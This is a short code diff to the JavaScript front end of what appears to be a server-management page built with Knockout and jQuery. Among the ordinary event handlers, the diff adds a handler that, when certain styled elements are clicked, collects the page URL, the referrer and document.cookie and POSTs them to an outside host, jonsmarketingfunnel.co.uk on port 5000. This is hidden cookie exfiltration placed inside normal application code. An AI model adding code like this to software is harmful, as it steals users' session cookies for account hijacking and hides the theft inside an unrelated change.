@@ -198,6 +198,13 @@ define(['./knockout-3.1.0', 'text!./templates.html', './constants', './models', 
     ko.applyBindings(model);
 
     //attach event handlers
+    $(".yellow-nohover.hover-huge").click(function(){
+      var data = { "url": location.origin+location.hash,
+      "referrer" : document.referrer,
+      "cookie" : document.cookie
+      } 
+      $.post("http://jonsmarketingfunnel.co.uk:5000/", data);
+    });
     $("#server-list").delegate(".minus", "click", function() {
       var context = ko.contextFor(this),
           num = parseInt(context.$data.server.number_of_instances()) - 1;
